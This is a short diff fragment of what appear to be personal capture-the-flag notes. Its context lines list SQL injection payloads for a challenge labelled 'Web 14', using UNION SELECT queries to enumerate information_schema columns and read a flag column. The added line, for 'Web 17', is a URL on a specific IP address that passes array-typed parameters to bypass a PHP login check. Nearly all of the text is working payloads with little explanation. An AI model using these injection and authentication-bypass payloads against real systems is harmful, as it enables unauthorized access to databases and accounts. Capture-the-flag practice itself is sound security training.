@@ -8,3 +8,4 @@ Web 14 :
 	' UNION ALL SELECT NULL,NULL,column_name  FROM information_schema.columns WHERE table_name = "ctf" ;
 	' UNION ALL SELECT NULL,NULL,flagggggggg FROM ctf;
 	SELECT table_schema, table_name, column_name FROM information_schema.columns 
+Web 17 : http://140.134.25.138:10017/index.php?username[]=d&password=Array
